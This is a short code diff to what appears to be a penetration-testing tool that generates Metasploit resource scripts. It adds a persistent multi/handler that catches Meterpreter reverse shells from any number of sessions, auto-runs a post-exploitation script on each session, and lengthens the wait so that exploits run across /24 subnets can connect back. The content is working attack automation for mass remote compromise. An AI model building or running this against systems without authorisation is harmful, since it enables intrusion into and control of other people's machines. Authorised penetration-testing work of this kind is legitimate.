@@ -424,6 +424,17 @@ def build_msf_rc(
         f"setg LHOST {lhost}",
         f"setg LPORT {lport}",
         "",
+        # Start a generic multi/handler first so reverse shells from any exploit
+        # land immediately without needing a separate listener process.
+        "# === Persistent Reverse Shell Handler ===",
+        "use exploit/multi/handler",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        f"set LHOST {lhost}",
+        f"set LPORT {lport}",
+        "set ExitOnSession false",       # keep handler alive for multiple sessions
+        f"set AutoRunScript multi_console_command -rc {post_rc_path}",
+        "run -j -z",                     # background and don't interact on new session
+        "",
     ]
 
     def add_module(
@@ -513,7 +524,11 @@ def build_msf_rc(
 
     lines.append("# === Finish ===")
     lines.append("jobs -l")
-    lines.append("sleep 10")
+    # sleep 10 is too short — scanners against /24 subnets need 60-120s.
+    # Without this wait, msfconsole exits before background jobs complete
+    # and sessions from exploits never get a chance to connect back.
+    lines.append("sleep 90")
+    lines.append("jobs -l")
     lines.append("sessions -l")
     lines.append("exit")
 
